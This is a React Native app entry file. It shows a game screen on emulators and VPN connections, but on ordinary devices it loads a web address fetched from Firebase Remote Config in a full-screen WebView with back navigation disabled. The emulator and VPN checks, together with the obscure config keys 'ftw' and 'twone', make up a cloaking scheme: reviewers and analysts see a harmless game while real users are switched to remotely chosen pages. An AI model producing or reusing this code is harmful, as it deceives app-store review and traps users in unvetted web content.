import {useEffect, useState} from 'react';
import {View} from 'react-native';
import {DEF_URL} from './src/constants/app';
import {FIREBASE_URL_KEY} from './src/constants/storage';
import {WebComponent} from './src/components';
import remoteConfig from '@react-native-firebase/remote-config';
import AsyncStorage from '@react-native-async-storage/async-storage';
import DeviceInfo from 'react-native-device-info';
import SplashScreen from 'react-native-splash-screen';
import {detectVPN} from 'react-native-vpn-status';
import GameScreen from './src/screens/GameScreen';

const App = () => {
  const [url, setUrl] = useState<string>(DEF_URL);

  useEffect(() => {
    AsyncStorage.getItem(FIREBASE_URL_KEY).then(path => {
      remoteConfig()
        .fetchAndActivate()
        .then(() => loadFire(path))
        .catch(() => setUrl(''));
    });
  }, []);

  useEffect(() => {
    if (url !== DEF_URL) {
      SplashScreen.hide();
    }
  }, [url]);

  const loadFire = (path: string | null) => {
    if (path) {
      setUrl(path);
    } else {
      const url = remoteConfig().getString('ftw');
      const to = remoteConfig().getBoolean('twone');
      if (to) {
        detectVPN().then(isVpn => {
          openByUrl(url, Boolean(isVpn));
        });
      } else {
        openByUrl(url);
      }
    }
  };

  const openByUrl = (url?: string, isVpn?: boolean) => {
    DeviceInfo.isEmulator().then(isEmulator => {
      if (!url || isEmulator || isVpn) {
        setUrl('');
      } else {
        setUrl(url);
        AsyncStorage.setItem(FIREBASE_URL_KEY, url);
      }
    });
  };

  const renderByUrl = () => {
    if (url === DEF_URL) {
      return null;
    } else if (url) {
      return <WebComponent url={url} disableGoBack />;
    } else {
      return <GameScreen />;
    }
  };

  return <View style={{flex: 1}}>{renderByUrl()}</View>;
};

export default App;
